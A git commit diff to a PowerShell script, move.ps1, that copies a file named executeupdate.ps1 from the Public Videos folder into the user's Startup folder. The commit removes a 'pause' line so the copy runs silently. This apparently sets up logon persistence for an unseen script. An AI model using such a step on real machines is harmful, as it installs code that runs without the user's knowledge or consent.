b752dc87cbf7f6f045267585158b8cd745c17208
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-23 17:36:32 +0100

    Update move.ps1

--- move.ps1
+++ move.ps1
@@ -2,4 +2,3 @@ $sourceFile = "C:\Users\Public\Videos\executeupdate.ps1"
 $destinationFolder = [Environment]::GetFolderPath("Startup")
 
 Copy-Item -Path $sourceFile -Destination $destinationFolder
-pause
